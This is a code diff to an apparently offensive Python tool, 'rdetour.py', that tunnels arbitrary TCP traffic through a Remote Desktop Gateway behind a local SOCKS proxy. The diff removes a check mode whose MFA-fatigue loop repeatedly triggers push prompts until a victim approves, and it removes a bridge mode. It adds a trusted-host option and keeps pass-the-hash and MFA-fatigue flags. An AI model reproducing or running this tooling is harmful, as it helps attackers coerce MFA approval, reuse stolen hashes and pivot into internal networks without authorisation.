@@ -737,58 +737,6 @@ def say(*a):
     print(*a, file=sys.stderr, flush=True)
 
 
-def bridge_mode(args):
-    """Bridge one channel to a local port for SSH mux or similar."""
-    host, port = args.target.rsplit(":", 1)
-    lport = args.bridge
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind((args.socks_host, lport))
-    srv.listen(1)
-    say("[bridge] listening on %s:%d — connect your mux client "
-        "(ssh -D / chisel etc.)" % (args.socks_host, lport))
-    client, _ = srv.accept()
-    say("[bridge] client connected — paying the ONE tunnel MFA now "
-        "(approve the push)")
-    t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
-                  args.password, nthash=args.nthash, path=args.rdg_path,
-                  client_name=args.client_name,
-                  connect_timeout=args.timeout, verbose=args.verbose,
-                  ext_auth=args.ext_auth, paa_cookie=args.paa_cookie)
-    t.establish(auth_timeout=args.mfa_auth_timeout)
-    t.open_channel(host, int(port))
-    say("[bridge] tunnel + channel up to %s:%d" % (host, int(port)))
-
-    def up():
-        try:
-            while True:
-                d = client.recv(65536)
-                if not d:
-                    break
-                t.write(d)
-        except OSError:
-            pass
-        finally:
-            t.close()
-
-    threading.Thread(target=up, daemon=True).start()
-    try:
-        while True:
-            d = t.read(timeout=2)
-            if d:
-                client.sendall(d)
-            if t.closed or not t.channel_open:
-                break
-    except (OSError, RDGError):
-        pass
-    finally:
-        t.close()
-        client.close()
-        srv.close()
-    say("[bridge] session ended (channel is single-use; rerun for another)")
-    return 0
-
-
 class SocksServer:
     def __init__(self, args, tunnel_factory):
         self.args = args
@@ -1188,6 +1136,8 @@ class WarmSocksServer(SocksServer):
         self.scout_lock = threading.Lock()
         self.scout_tunnel_lock = threading.Lock()
         self.known_good = set()
+        for th in getattr(args, 'trust_hosts', []):
+            self.known_good.add("%s:0" % th.strip().lower())
         self.gw_guid = None
         self.gw_guid_tried = False
         self.gw_ips = set()
@@ -1358,17 +1308,10 @@ class WarmSocksServer(SocksServer):
                 client.settimeout(None)
             no_scout = getattr(self.args, 'no_scout', False)
             host_known = any(k.startswith(h + ":") for k in self.known_good)
-            is_scout = (not no_scout and not host_known
+            is_scout = (not no_scout and port == 445
+                        and not host_known
                         and key not in self.known_good
-                        and not (port == 445
-                                 and getattr(self.args, 'gw_fallback', True)))
-            if is_scout:
-                wt = self.tunnel
-                if wt is not None and not wt.closed:
-                    self.stats["failed"] += 1
-                    self._abort(client, replied, 0x05,
-                                "scout blocked — warm tunnel alive")
-                    return
+                        and not getattr(self.args, 'gw_fallback', True))
             is_priority = (not is_scout and host_known)
             if is_scout:
                 lock = self.scout_lock
@@ -1431,7 +1374,9 @@ class WarmSocksServer(SocksServer):
                         self._ensure_gw_guid(t)
                     t.open_channel(
                         [host, "127.0.0.1"] if use_fb else host, port)
-                except (RDGPolicyError, RDGUnreachableError):
+                except RDGPolicyError:
+                    raise
+                except RDGUnreachableError:
                     t.closed = True
                     try:
                         t.close()
@@ -1774,55 +1719,6 @@ class WarmSocksServer(SocksServer):
                    self.stats["scout_deaths"], self.stats["promoted"]))
 
 
-def check_mode(args):
-    host, port = args.target.rsplit(":", 1)
-
-    def open_tunnel():
-        t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
-                      args.password, nthash=args.nthash, path=args.rdg_path,
-                      client_name=args.client_name,
-                      connect_timeout=args.timeout, verbose=args.verbose,
-                      ext_auth=args.ext_auth, paa_cookie=args.paa_cookie)
-        t.connect_tunnel(host, int(port), auth_timeout=args.mfa_auth_timeout)
-        return t
-
-    if args.mfa_fatigue:
-        attempt = 0
-        while True:
-            attempt += 1
-            wait = args.mfa_interval
-            if args.mfa_jitter:
-                wait += random.randint(-args.mfa_jitter, args.mfa_jitter)
-            print("[fatigue] push %d (approve on the phone; %ds window)..."
-                  % (attempt, args.mfa_auth_timeout), file=sys.stderr,
-                  flush=True)
-            try:
-                t = open_tunnel()
-                print("[fatigue] approved on push %d — tunnel live" % attempt,
-                      file=sys.stderr, flush=True)
-                break
-            except MfaNotApproved as e:
-                if args.mfa_max and attempt >= args.mfa_max:
-                    raise RDGError("fatigue: %d pushes exhausted (%s)"
-                                   % (args.mfa_max, e))
-                print("[fatigue] %s — next push in %ds"
-                      % (e, max(wait, 1)), file=sys.stderr, flush=True)
-                time.sleep(max(wait, 1))
-    else:
-        t = open_tunnel()
-    print("[+] tunnel established to %s:%s" % (host, port))
-    if args.probe == "smb":
-        t.write(smb2_negotiate())
-        r = t.read(timeout=10)
-        if r:
-            print("[+] SMB2 reply %d bytes: %s" % (len(r), r[:32].hex()))
-            print("[+] arbitrary TCP through RDG confirmed")
-        else:
-            print("[-] no SMB2 reply (channel open but target silent)")
-    t.close()
-    return 0
-
-
 def parse_args(argv=None):
     ap = argparse.ArgumentParser(
         prog="rdetour.py",
@@ -1838,9 +1734,6 @@ def parse_args(argv=None):
     ap.add_argument("-p", "--password", default="",
                     help="password (fallback: env RDETOUR_PASSWORD)")
     ap.add_argument("--hashes", help="LM:NT (pass-the-hash)")
-    ap.add_argument("--target", help="host:port — one-shot check mode, no SOCKS")
-    ap.add_argument("--probe", choices=["smb", "none"], default="smb",
-                    help="check-mode payload (default: %(default)s)")
     ap.add_argument("--socks-host", default="127.0.0.1")
     ap.add_argument("--socks-port", type=int, default=1080)
     ap.add_argument("--timeout", type=int, default=15,
@@ -1852,8 +1745,6 @@ def parse_args(argv=None):
                     default="none",
                     help="extended-auth mode (default: %(default)s)")
     ap.add_argument("--paa-cookie", help="PAA cookie string (with --ext-auth paa)")
-    ap.add_argument("--bridge", type=int, metavar="PORT",
-                    help="bridge channel to local PORT (with --target)")
     ap.add_argument("--mfa-fatigue", action="store_true",
                     help="retry tunnel auth on a cadence; each attempt "
                          "triggers a fresh MFA push until approved")
@@ -1872,6 +1763,10 @@ def parse_args(argv=None):
     ap.add_argument("--no-scout", dest="no_scout", action="store_true",
                     default=False,
                     help="disable scout tunnel (single-tunnel mode)")
+    ap.add_argument("--trust-host", dest="trust_hosts", action="append",
+                    default=[],
+                    help="pre-trust a host (skip scout, use warm tunnel); "
+                         "repeatable")
     ap.add_argument("--no-session-reuse", dest="session_reuse",
                     action="store_false", default=True,
                     help="disable cookie/session reuse across tunnel rebuilds")
@@ -1918,26 +1813,6 @@ def main(argv=None):
             t.establish(auth_timeout=auth_timeout)
         return t
 
-    if args.target and args.bridge:
-        try:
-            return bridge_mode(args)
-        except MfaNotApproved as e:
-            print("[-] %s" % e, file=sys.stderr)
-            return 2
-        except RDGError as e:
-            print("[-] %s" % e, file=sys.stderr)
-            return 1
-    if args.target:
-        try:
-            return check_mode(args)
-        except MfaNotApproved as e:
-            print("[-] %s" % e, file=sys.stderr)
-            if not args.mfa_fatigue:
-                print("[!] try --mfa-fatigue", file=sys.stderr)
-            return 2
-        except RDGError as e:
-            print("[-] %s" % e, file=sys.stderr)
-            return 1
     WarmSocksServer(args, factory, scout_factory=factory).serve()
     return 0
 
